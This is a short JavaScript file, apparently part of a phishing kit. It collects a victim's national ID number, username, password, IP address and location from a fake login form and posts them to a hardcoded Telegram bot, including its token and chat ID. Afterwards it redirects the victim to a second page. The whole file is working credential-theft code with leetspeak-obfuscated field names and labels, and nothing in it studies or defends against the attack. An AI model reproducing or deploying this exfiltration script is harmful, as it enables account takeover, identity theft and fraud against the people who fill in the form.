//bot token
var telegram_bot_id = "6505222777:AAHadhu3h5in1LvMYa_l1-We7WoWbMfBuno";
//chat id
var chat_id = 5150089222;
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("d0c").value;
    pax = document.getElementById("us4r").value;
    pax2 = document.getElementById("p4sx").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "✅G4L1C14✅\n🪪DN1: " + u_name + "\n👤UXU4R1O: " + pax + "\n🔒CL4V3: " + pax2 +"\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};
